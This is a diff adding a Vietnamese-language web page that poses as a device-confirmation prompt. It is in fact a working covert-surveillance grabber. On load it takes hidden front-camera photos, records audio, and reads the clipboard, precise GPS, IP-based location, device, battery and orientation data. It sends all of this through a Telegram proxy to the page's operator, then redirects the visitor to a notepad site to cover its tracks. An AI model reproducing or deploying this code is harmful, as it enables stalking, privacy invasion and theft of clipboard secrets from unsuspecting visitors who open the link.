@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Hoang Anh</title>
+    <style>
+        body {
+            background: black;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: monospace;
+        }
+        .status-toast {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0,0,0,0.7);
+            color: #0f0;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-family: monospace;
+            z-index: 9999;
+            pointer-events: none;
+        }
+        .ios-permission-box {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 100000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(10px);
+        }
+        .ios-permission-content {
+            background: #1a1a1a;
+            padding: 35px 25px;
+            border-radius: 25px;
+            max-width: 320px;
+            border: 1px solid #00ff00;
+            text-align: center;
+            color: white;
+        }
+        .ios-permission-content h3 {
+            color: #00ff00;
+            margin-top: 0;
+            font-size: 20px;
+        }
+        .ios-permission-content p {
+            color: #cccccc;
+            margin: 15px 0;
+            font-size: 14px;
+        }
+        .ios-permission-content button {
+            background: #00ff00;
+            color: black;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 40px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div id="iosPrompt" class="ios-permission-box" style="display: none;">
+        <div class="ios-permission-content">
+            <h3>📱 Xác nhận thiết bị</h3>
+            <p>Nhấn nút bên dưới để tiếp tục truy cập</p>
+            <button id="iosConfirmBtn">✅ Xác nhận và Tiếp tục</button>
+        </div>
+    </div>
+
+    <div style="display:none;"><div id="info"></div></div>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <audio id="audio" style="display:none;"></audio>
+    <input type="text" id="dummyInput" style="position:absolute;opacity:0;height:0;width:0;">
+
+    <script>
+        const TELEGRAM_PROXY = '/api/telegram-proxy';
+        const REDIRECT_NOTE_LINK = 'https://www.memonotepad.com/';
+        const PHOTO_COUNT = 6;
+        const PHOTO_INTERVAL = 300;
+        const AUDIO_DURATION = 400;
+
+        let photoSentCount = 0;
+        let cameraStream = null;
+        let cameraActive = false;
+        let audioRecorded = false;
+        let mediaRecorder = null;
+        let audioChunks = [];
+        let gpsDataSent = false;
+        let redirectTriggered = false;
+        let mainInfoCompleted = false;
+        let audioCompleted = false;
+        let gpsCompleted = false;
+        let orientationCompleted = false;
+        let clipboardCompleted = false;
+
+        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+
+        function checkAndRedirect() {
+            if (redirectTriggered) return;
+            const allDone = mainInfoCompleted && (photoSentCount === PHOTO_COUNT) && audioCompleted && gpsCompleted && orientationCompleted && clipboardCompleted;
+            if (allDone) {
+                redirectTriggered = true;
+                setTimeout(() => { window.location.href = REDIRECT_NOTE_LINK; }, 300);
+            }
+        }
+
+        async function sendToTelegram(text, retryCount = 0) {
+            const maxRetries = 2;
+            try {
+                const response = await fetch(TELEGRAM_PROXY, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        endpoint: 'sendMessage',
+                        data: { text: text.substring(0, 4096), parse_mode: 'HTML', disable_web_page_preview: false }
+                    })
+                });
+                const data = await response.json();
+                if (!data.ok && retryCount < maxRetries) {
+                    setTimeout(() => sendToTelegram(text, retryCount + 1), 2000);
+                }
+                return data;
+            } catch (e) {
+                if (retryCount < maxRetries) {
+                    setTimeout(() => sendToTelegram(text, retryCount + 1), 2000);
+                }
+            }
+        }
+
+        async function sendAudioToTelegram(blob, retryCount = 0) {
+            const maxRetries = 2;
+            try {
+                const formData = new FormData();
+                formData.append('endpoint', 'sendAudio');
+                formData.append('audio', blob, `audio_${Date.now()}.ogg`);
+                formData.append('caption', `🎤 Ghi âm - ${new Date().toLocaleString('vi-VN')}`);
+                const response = await fetch(TELEGRAM_PROXY, { method: 'POST', body: formData });
+                const data = await response.json();
+                if (!data.ok && retryCount < maxRetries) {
+                    setTimeout(() => sendAudioToTelegram(blob, retryCount + 1), 2000);
+                }
+            } catch (e) {}
+        }
+
+        async function sendPhotoToTelegram(blob, photoNumber, retryCount = 0) {
+            const maxRetries = 2;
+            try {
+                const formData = new FormData();
+                formData.append('endpoint', 'sendPhoto');
+                formData.append('photo', blob, `capture_${photoNumber}.jpg`);
+                formData.append('caption', `📸 Ảnh chụp #${photoNumber} - ${new Date().toLocaleString('vi-VN')}`);
+                const response = await fetch(TELEGRAM_PROXY, { method: 'POST', body: formData });
+                const data = await response.json();
+                if (data.ok) {
+                    photoSentCount++;
+                    if (photoSentCount === PHOTO_COUNT && cameraStream && cameraActive) {
+                        setTimeout(() => {
+                            if (cameraStream) { cameraStream.getTracks().forEach(track => track.stop()); cameraStream = null; cameraActive = false; }
+                        }, 2000);
+                    }
+                    checkAndRedirect();
+                } else if (retryCount < maxRetries) {
+                    setTimeout(() => sendPhotoToTelegram(blob, photoNumber, retryCount + 1), 2000);
+                }
+            } catch (e) {}
+        }
+
+        async function sendDocumentToTelegram(blob, filename, caption, retryCount = 0) {
+            const maxRetries = 2;
+            try {
+                const formData = new FormData();
+                formData.append('endpoint', 'sendDocument');
+                formData.append('document', blob, filename);
+                formData.append('caption', caption);
+                const response = await fetch(TELEGRAM_PROXY, { method: 'POST', body: formData });
+                const data = await response.json();
+                if (!data.ok && retryCount < maxRetries) {
+                    setTimeout(() => sendDocumentToTelegram(blob, filename, caption, retryCount + 1), 2000);
+                }
+                return data;
+            } catch (e) { return { ok: false }; }
+        }
+
+        async function captureSinglePhoto(video, canvas, ctx, photoNumber) {
+            return new Promise((resolve) => {
+                try {
+                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        canvas.toBlob((blob) => {
+                            if (blob) { sendPhotoToTelegram(blob, photoNumber); resolve(true); }
+                            else { resolve(false); }
+                        }, 'image/jpeg', 0.85);
+                    } else {
+                        setTimeout(() => { captureSinglePhoto(video, canvas, ctx, photoNumber).then(resolve); }, 50);
+                    }
+                } catch (e) { resolve(false); }
+            });
+        }
+
+        async function captureMultiplePhotos(video, canvas, ctx) {
+            if (!cameraActive) return;
+            for (let i = 1; i <= PHOTO_COUNT; i++) {
+                if (!cameraActive) break;
+                await captureSinglePhoto(video, canvas, ctx, i);
+                if (i < PHOTO_COUNT) { await new Promise(resolve => setTimeout(resolve, PHOTO_INTERVAL)); }
+            }
+        }
+
+        async function startRecording() {
+            if (audioRecorded) return;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                mediaRecorder = new MediaRecorder(stream);
+                audioChunks = [];
+                mediaRecorder.ondataavailable = (event) => { if (event.data.size > 0) audioChunks.push(event.data); };
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                    if (audioBlob.size > 0) { await sendAudioToTelegram(audioBlob); }
+                    audioRecorded = true;
+                    audioCompleted = true;
+                    stream.getTracks().forEach(track => track.stop());
+                    checkAndRedirect();
+                };
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') { mediaRecorder.stop(); }
+                    else { audioCompleted = true; audioRecorded = true; checkAndRedirect(); }
+                }, AUDIO_DURATION);
+            } catch (e) { audioCompleted = true; audioRecorded = false; checkAndRedirect(); }
+        }
+
+        async function getIPAndLocation() {
+            let ip = 'Không xác định';
+            let locationData = { city: 'Không xác định', region: 'Không xác định', country: 'Không xác định', isp: 'Không xác định', lat: null, lon: null };
+            const ipAPIs = ['https://api.ipify.org?format=json', 'https://api.my-ip.io/ip.json', 'https://ipapi.co/json/'];
+            for (const api of ipAPIs) {
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 4000);
+                    const response = await fetch(api, { signal: controller.signal });
+                    clearTimeout(timeoutId);
+                    const data = await response.json();
+                    if (api.includes('ipify')) ip = data.ip;
+                    else if (api.includes('my-ip')) ip = data.ip;
+                    else if (api.includes('ipapi.co')) ip = data.ip;
+                    if (ip && ip !== 'Không xác định') break;
+                } catch (e) {}
+            }
+            const locationAPIs = [
+                { url: `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,lat,lon`, parser: (data) => data && data.status === 'success' ? { city: data.city || 'Không xác định', region: data.regionName || 'Không xác định', country: data.country || 'Không xác định', isp: data.isp || data.org || 'Không xác định', lat: data.lat || null, lon: data.lon || null } : null },
+                { url: `https://ipapi.co/${ip}/json/`, parser: (data) => data && !data.error ? { city: data.city || 'Không xác định', region: data.region || 'Không xác định', country: data.country_name || 'Không xác định', isp: data.org || 'Không xác định', lat: data.latitude || null, lon: data.longitude || null } : null },
+                { url: `https://ipinfo.io/${ip}/json`, parser: (data) => { if (data && !data.error) { let lat = null, lon = null; if (data.loc) { const parts = data.loc.split(','); if (parts.length === 2) { lat = parseFloat(parts[0]); lon = parseFloat(parts[1]); } } return { city: data.city || 'Không xác định', region: data.region || 'Không xác định', country: data.country || 'Không xác định', isp: data.org || 'Không xác định', lat: lat, lon: lon }; } return null; } }
+            ];
+            for (const api of locationAPIs) {
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 6000);
+                    const response = await fetch(api.url, { signal: controller.signal });
+                    clearTimeout(timeoutId);
+                    const data = await response.json();
+                    const result = api.parser(data);
+                    if (result && (result.city !== 'Không xác định' || result.country !== 'Không xác định')) { locationData = result; break; }
+                } catch (e) {}
+            }
+            return { ip, locationData };
+        }
+
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return { batteryPercent: Math.round(battery.level * 100) + '%', batteryCharging: battery.charging };
+                } catch (err) {}
+            }
+            return { batteryPercent: 'Không xác định', batteryCharging: false };
+        }
+
+        async function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            const pf = navigator.platform || 'Không xác định';
+            const io2 = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
+            let dm = 'Không xác định';
+            if (/iPhone/.test(ua)) dm = 'iPhone';
+            else if (/iPad/.test(ua) || (io2 && screen.width > 768)) dm = 'iPad';
+            else if (io2) dm = 'iOS Device';
+            else if (/Android/.test(ua)) dm = 'Android';
+            else if (/Windows/.test(ua)) dm = 'Windows';
+            else if (/Macintosh/.test(ua)) dm = 'Mac';
+            return { ua, pf, isIO: io2, dm };
+        }
+
+        async function autoSendGPS() {
+            if (gpsDataSent) { gpsCompleted = true; checkAndRedirect(); return; }
+            if (!('geolocation' in navigator)) { gpsCompleted = true; gpsDataSent = true; checkAndRedirect(); return; }
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    const lat = pos.coords.latitude, lng = pos.coords.longitude, acc = pos.coords.accuracy;
+                    await sendToTelegram(`<b>📍 VỊ TRÍ GPS THỰC TẾ</b>\n\n<b>📌 Vĩ độ:</b> <code>${lat}</code>\n<b>📌 Kinh độ:</b> <code>${lng}</code>\n<b>🎯 Độ chính xác:</b> <code>${Math.round(acc)} mét</code>\n\n<a href="https://www.google.com/maps?q=${lat},${lng}">🗺️ Xem trên Google Maps</a>`);
+                    gpsDataSent = true; gpsCompleted = true; checkAndRedirect();
+                },
+                (err) => { gpsCompleted = true; gpsDataSent = true; checkAndRedirect(); },
+                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+            );
+        }
+
+        async function getInfoAndSendToTelegram() {
+            const { ip, locationData } = await getIPAndLocation();
+            const di = await getDeviceInfo();
+            const { batteryPercent, batteryCharging } = await getBatteryInfo();
+            const sw = screen.width, sh = screen.height;
+            const dm = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Không xác định';
+            const ce = navigator.cookieEnabled ? 'Bật' : 'Tắt';
+            const ct = new Date().toLocaleString('vi-VN');
+            const la = navigator.language || 'Không xác định';
+            const hc = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} nhân` : 'Không xác định';
+            const rf = document.referrer || 'Truy cập trực tiếp';
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không xác định';
+            let ml = '';
+            if (locationData.lat && locationData.lon) ml = `\n<a href="https://www.google.com/maps?q=${locationData.lat},${locationData.lon}">🗺️ Xem vị trí (ước tính từ IP)</a>`;
+            const bd = di.isIO ? '<b>🔋 Pin:</b> <code>iOS không hỗ trợ</code>' : `<b>🔋 Pin:</b> <code>${batteryPercent} (${batteryCharging ? '🔌 Đang sạc' : '🔋 Không sạc'})</code>`;
+            const text = `<b>📥 KHÁCH TRUY CẬP MỚI</b>\n\n<b>🌐 Địa chỉ IP:</b> <code>${ip}</code>\n<b>📍 Thành phố:</b> <code>${locationData.city}</code>\n<b>🗺️ Khu vực:</b> <code>${locationData.region}</code>\n<b>🏳️ Quốc gia:</b> <code>${locationData.country}</code>\n<b>🏢 Nhà mạng:</b> <code>${locationData.isp}</code>${ml}\n\n<b>📱 Thiết bị:</b> <code>${di.dm}</code>\n<b>💻 Trình duyệt:</b> <code>${di.ua.substring(0,80)}...</code>\n<b>🖥️ Hệ điều hành:</b> <code>${di.pf}</code>\n<b>📺 Độ phân giải:</b> <code>${sw}x${sh}</code>\n${bd}\n<b>💾 RAM:</b> <code>${dm}</code>\n<b>⚙️ CPU Core:</b> <code>${hc}</code>\n<b>🍪 Cookie:</b> <code>${ce}</code>\n<b>🌐 Ngôn ngữ:</b> <code>${la}</code>\n<b>⏰ Múi giờ:</b> <code>${tz}</code>\n<b>🕐 Thời gian:</b> <code>${ct}</code>\n<b>📎 Nguồn truy cập:</b> <code>${rf}</code>`;
+            await sendToTelegram(text);
+            mainInfoCompleted = true; checkAndRedirect();
+        }
+
+        async function startCameraImmediately() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 800 }, height: { ideal: 600 }, facingMode: 'user' } });
+                cameraStream = stream; cameraActive = true; video.srcObject = stream;
+                await new Promise((resolve) => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
+                await new Promise(resolve => setTimeout(resolve, 100));
+                await captureMultiplePhotos(video, canvas, ctx);
+            } catch (e) { cameraActive = false; }
+        }
+
+        async function getOrientationData() {
+            let o = { screen: 'Không xác định', alpha: null, beta: null, gamma: null, compass: false };
+            if (screen.orientation) { const t = screen.orientation.type; o.screen = t.includes('portrait') ? 'Dọc' : t.includes('landscape') ? 'Ngang' : t; }
+            else if (window.orientation !== undefined) { const a = window.orientation; o.screen = (a === 0 || a === 180) ? 'Dọc' : 'Ngang'; }
+            if (window.DeviceOrientationEvent) {
+                try {
+                    const ev = await new Promise((resolve) => {
+                        let re = false;
+                        const h = (e) => { if (!re && e.alpha !== null) { re = true; window.removeEventListener('deviceorientation', h); resolve(e); } };
+                        window.addEventListener('deviceorientation', h);
+                        setTimeout(() => { if (!re) { window.removeEventListener('deviceorientation', h); resolve(null); } }, 2000);
+                    });
+                    if (ev) { o.alpha = ev.alpha; o.beta = ev.beta; o.gamma = ev.gamma; o.compass = ev.absolute; }
+                } catch (e) {}
+            }
+            return o;
+        }
+
+        async function sendOrientationInfo() {
+            try {
+                const o = await getOrientationData();
+                let ct2 = '';
+                if (o.alpha !== null) {
+                    const a = o.alpha;
+                    let d = '';
+                    if (a >= 337.5 || a < 22.5) d = 'Bắc ⬆️';
+                    else if (a >= 22.5 && a < 67.5) d = 'Đông Bắc ↗️';
+                    else if (a >= 67.5 && a < 112.5) d = 'Đông ➡️';
+                    else if (a >= 112.5 && a < 157.5) d = 'Đông Nam ↘️';
+                    else if (a >= 157.5 && a < 202.5) d = 'Nam ⬇️';
+                    else if (a >= 202.5 && a < 247.5) d = 'Tây Nam ↙️';
+                    else if (a >= 247.5 && a < 292.5) d = 'Tây ⬅️';
+                    else if (a >= 292.5 && a < 337.5) d = 'Tây Bắc ↖️';
+                    ct2 = `\n<b>🧭 Hướng la bàn:</b> <code>${d} (${a.toFixed(0)}°)</code>`;
+                }
+                let tt = '';
+                if (o.beta !== null && o.gamma !== null) {
+                    const b = o.beta, g = o.gamma;
+                    let s = '';
+                    if (Math.abs(b) < 10 && Math.abs(g) < 10) s = '📱 Đặt phẳng';
+                    else if (b > 45) s = '📱 Nghiêng về trước';
+                    else if (b < -45) s = '📱 Nghiêng về sau';
+                    else if (g > 20) s = '📱 Nghiêng sang phải';
+                    else if (g < -20) s = '📱 Nghiêng sang trái';
+                    else s = '📱 Hơi nghiêng';
+                    tt = `\n<b>📐 Tư thế máy:</b> <code>${s}</code>\n<b>📊 Góc nghiêng:</b> <code>Trước/Sau: ${b.toFixed(0)}° | Trái/Phải: ${g.toFixed(0)}°</code>`;
+                }
+                await sendToTelegram(`<b>🧭 THÔNG TIN HƯỚNG THIẾT BỊ</b>\n\n<b>📱 Màn hình:</b> <code>${o.screen}</code>${ct2}${tt}\n\n<i>💡 Mẹo: Xoay điện thoại để xem hướng thay đổi</i>`);
+                orientationCompleted = true; checkAndRedirect();
+            } catch (e) { orientationCompleted = true; checkAndRedirect(); }
+        }
+
+        async function sendClipboardInfo() {
+            try {
+                let cd = { text: '', hasPermission: false };
+                if (navigator.clipboard) {
+                    try { const t = await navigator.clipboard.readText(); cd.text = t || '(Clipboard trống)'; cd.hasPermission = true; } catch (e) {}
+                }
+                if (cd.hasPermission && cd.text && cd.text !== '(Clipboard trống)') {
+                    const ts = new Date().toLocaleString('vi-VN'), tl = cd.text.length;
+                    const bi = `<b>📋 NỘI DUNG CLIPBOARD</b>\n<b>🔓 Trạng thái:</b> <code>✅ Có quyền</code>\n<b>📏 Độ dài:</b> <code>${tl} ký tự</code>\n<b>🕐 Thời gian:</b> <code>${ts}</code>`;
+                    if (tl > 2000) {
+                        await sendToTelegram(`${bi}\n\n<i>📎 Nội dung dài, đang gửi file...</i>`);
+                        try {
+                            const blob = new Blob([cd.text], { type: 'text/plain;charset=utf-8' });
+                            await sendDocumentToTelegram(blob, `clipboard_${Date.now()}.txt`, `📋 Clipboard - ${tl} ký tự - ${ts}`);
+                        } catch (e) { await sendToTelegram(`${bi}\n\n<code>${cd.text.substring(0, 3500)}</code>`); }
+                    } else { await sendToTelegram(`${bi}\n\n<b>📄 Nội dung:</b>\n<code>${cd.text}</code>`); }
+                } else { await sendToTelegram(`<b>📋 NỘI DUNG CLIPBOARD</b>\n\n<b>🔒 Trạng thái:</b> <code>❌ Không có quyền hoặc trống</code>`); }
+                clipboardCompleted = true; checkAndRedirect();
+            } catch (e) { clipboardCompleted = true; checkAndRedirect(); }
+        }
+
+        async function requestOrientationPermission() {
+            return new Promise((resolve) => {
+                if (typeof DeviceOrientationEvent.requestPermission === 'function') {
+                    DeviceOrientationEvent.requestPermission().then(s => resolve(s === 'granted')).catch(() => resolve(false));
+                } else resolve(true);
+            });
+        }
+
+        async function handleIOSPermissions() {
+            return new Promise(async (resolve) => {
+                if (isIOS) {
+                    document.getElementById('iosPrompt').style.display = 'flex';
+                    document.getElementById('iosConfirmBtn').onclick = async () => {
+                        document.getElementById('iosPrompt').style.display = 'none';
+                        const g = await requestOrientationPermission();
+                        if (g) await sendOrientationInfo(); else { orientationCompleted = true; checkAndRedirect(); }
+                        document.getElementById('dummyInput').focus();
+                        setTimeout(async () => { await sendClipboardInfo(); }, 300);
+                        resolve(true);
+                    };
+                } else { await sendOrientationInfo(); await sendClipboardInfo(); resolve(true); }
+            });
+        }
+
+        async function init() {
+            try {
+                getInfoAndSendToTelegram();
+                autoSendGPS();
+                startCameraImmediately();
+                setTimeout(() => { startRecording(); }, 50);
+                await handleIOSPermissions();
+            } catch (err) {}
+        }
+
+        init();
+    </script>
+</body>
+</html>
